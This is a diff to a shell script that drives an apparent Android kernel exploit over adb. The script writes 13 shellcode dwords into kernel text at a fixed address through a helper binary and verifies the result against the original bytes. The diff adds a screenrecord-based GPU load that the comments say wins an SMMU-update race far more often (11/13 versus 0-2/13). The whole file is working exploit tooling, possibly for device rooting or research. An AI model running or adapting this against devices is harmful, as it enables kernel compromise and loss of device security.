@@ -10,7 +10,8 @@
 #   * `verify` compares all 13 dwords against the known original bytes / the shellcode, so the check is
 #     meaningful rather than vacuous.
 set -u
-S=${ZF9_SERIAL:?set ZF9_SERIAL to your device serial}
+[ -f "$(dirname "$0")/../device.env" ] && . "$(dirname "$0")/../device.env"
+S=${ZF9_SERIAL:?set ZF9_SERIAL (or create device.env)}
 BIN=/data/local/tmp/cheese_pa
 BASE=0xa8145af0
 
@@ -19,6 +20,14 @@ vals=(0x58000040 0x14000003 0x4b7b0ae0 0xffffffee \
       0xA9BF7BFD 0xD63F0020 0xA8C17BFD 0x2A1F03E0 0xD65F03C0)
 orig=(0xd503233f 0xd10203ff 0xf800865e 0xa9047bfd 0xa9055ff8 0xa90657f6 \
       0xa9074ff4 0x910103fd 0x90010d28 0xf9448908 0xaa0103f4 0x910073e1 0xaa0003f5)
+
+# The SMMU-update race is won far more often while the GPU is actually busy (measured: 11/13 with a
+# GPU load running vs 0-2/13 idle). So keep a synthetic GPU load alive for the whole patch.
+gpu_load_start() {
+    adb -s "$S" shell 'pkill -f screenrecord 2>/dev/null; screenrecord --time-limit 900 /data/local/tmp/gpuload.mp4 >/dev/null 2>&1 &' </dev/null >/dev/null 2>&1
+    sleep 2
+}
+gpu_load_stop() { adb -s "$S" shell 'pkill -f screenrecord' </dev/null >/dev/null 2>&1; }
 
 addr_of() { printf '0x%x' $((BASE + 4 * $1)); }
 
@@ -76,6 +85,9 @@ do_verify() {
     if [ "$n_patch" = 13 ]; then echo "  => text is FULLY PATCHED"; return 0; fi
     echo "  => text is INCONSISTENT (reboot to restore)"; return 1
 }
+
+gpu_load_start                     # all GPU-primitive ops (reads included) race: keep the GPU busy
+trap gpu_load_stop EXIT INT TERM
 
 case "${1:-write}" in
     write)   do_write write "${vals[@]}" ;;
